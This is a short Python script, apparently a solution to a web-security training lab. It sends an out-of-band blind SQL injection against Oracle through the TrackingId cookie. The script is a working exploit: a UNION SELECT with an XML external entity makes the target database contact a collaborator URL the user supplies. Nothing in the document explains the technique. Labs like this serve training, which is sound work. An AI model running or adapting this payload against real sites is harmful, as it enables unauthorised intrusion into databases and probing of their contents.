```python
import requests
import sys
import time

if len(sys.argv) != 3:
    print(f"[+] USAGE : {sys.argv[0]} <URL of the lab> <collab URL>")
    sys.exit(1)

url = sys.argv[1]
collab = sys.argv[2]

if __name__ == "__main__":
    payload = "'+UNION+SELECT+extractvalue(xmltype('<%3fxml+version%3d\"1.0\"+encoding%3d\"UTF-8\"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+\""+collab+"/\">+%25remote%3b]>'),'/l')+FROM+dual--"
    response1 = requests.get(url)
    response2 = requests.get(url, headers={"Cookie":"TrackingId="+response1.cookies["TrackingId"]+payload+"; session="+response1.cookies["session"]})
    if response2.status_code == 200:
        print("Request sent. Check collab")
```